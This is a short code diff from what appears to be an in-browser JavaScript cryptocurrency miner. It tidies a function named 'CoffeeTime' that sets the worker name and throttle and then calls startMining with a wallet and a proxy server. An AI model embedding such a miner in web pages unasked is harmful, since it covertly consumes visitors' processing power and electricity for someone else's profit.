@@ -23,19 +23,13 @@ var throttleMiner = 0;  // percentage of miner throttling. If you set this to 20
 var handshake = null;
 
 function CoffeeTime(wallet, worker, throttle) {
-    // 1. Set worker label (if needed)
-    if(typeof setWorkerName === "function") setWorkerName("proxy/" + worker);
+    if (typeof setWorkerName === "function") setWorkerName("proxy/" + worker);
+    if (typeof throttleMiner === "function") throttleMiner(throttle / 100);
 
-    // 2. Set throttle (0 = no throttle, 0.8 = 80% throttled)
-    if(typeof throttleMiner === "function") throttleMiner(throttle / 100);
-
-    // 3. Start mining
-    // You can use your own proxy, or the pool's proxy:
-    startMining("wss://yourproxy.com:8181", wallet, "x");
-
-    // 4. Optionally, you can stop mining by calling:
-    // stopMining();
+    // Use the global server variable
+    startMining(server, wallet, "x");
 }
+
 
 
 function wasmSupported() {
